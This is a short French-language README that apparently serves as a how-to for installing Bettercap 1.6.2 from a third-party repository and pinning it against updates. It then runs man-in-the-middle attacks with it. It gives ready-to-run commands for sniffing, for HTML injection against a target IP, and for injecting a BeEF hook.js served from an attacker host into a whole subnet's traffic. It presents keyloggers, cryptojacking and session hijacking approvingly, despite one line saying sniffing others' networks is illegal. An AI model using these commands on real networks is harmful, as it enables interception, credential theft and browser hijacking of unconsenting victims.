# :heavy_check_mark: Bettercap 1.6.2
![alt text](https://www.bettercap.org/logo.png) </p>
Bettercap est un outils MITM multifonction, exemple : sniffing, injection ... </p>
:heavy_exclamation_mark: Cependant, sniffer un réseau qui n'est pas le votre est illégal. </p>
Dépendances à satisfaire => <b> ```apt-get install ruby ruby-colorize ruby-em-proxy ruby-net-dns ruby-network-interface ruby-packetfu ruby-packetfu ```</b> </p>
Pour télécharger :<b> ```git clone https://github.com/hurikayne/bettercap_1.6.2-0parrot1_all``` </b> </p>
:heavy_check_mark: install => <b>```dpkg -i bettercap_1.6.2-0parrot1_all.deb```</b> </p>
Bettercap 1.6.2 est une ancienne version de Bettercap, la 1.6.2 est plus simple. </p> Or à chaque "<b>```apt-get update```</b>" le paquet se mettera à jour, mais nous ne voulons pas cela donc pour empêcher la MAJ du paquet on lance la commande suivante : <b>```sudo apt-mark hold bettercap```</b> </p>
:heavy_check_mark: Pour sniffer un réseau (MITM): ```bettercap -X ```</p>
Pour de l'aide : <b>```bettercap -h``` </b></p>

Qu'est-ce que l'<b>injection</b> ? 
L'injection permet de placer un morceau de code non voulus par la/les victime(s), </p>exemple : injecter du html pour afficher un image à chaque page chargé par la victime, ou encore du javaScript pour injecter des keyloggers. </p>Avec JavaScript les possibilitées d'attaques sont énormes (cryptojacking :ok_hand:, session hijacking ...). 
:heavy_check_mark:</p>
Pour faire de l'injection: </p><b>```bettercap -I (INTERFACE ex:wlan0) -T (TARGET_IP) --proxy-https --httpd --proxy-module injecthtml --html-file xxxxx.html```</b>  </p>
Injection de code unique (Beef ex) :</p> <b>```sudo bettercap -I wlan0 -G 172.51.1.1 -T 172.51.0.0/23 --proxy-module injectjs --js-url "http://172.51.1.91:3000/hook.js"```</b></p>
L'utilisation de <b>Caplets</b> rend bettercap puissant. </p>


Pour plus de détails voir le site officiel : https://www.bettercap.org/  </p>



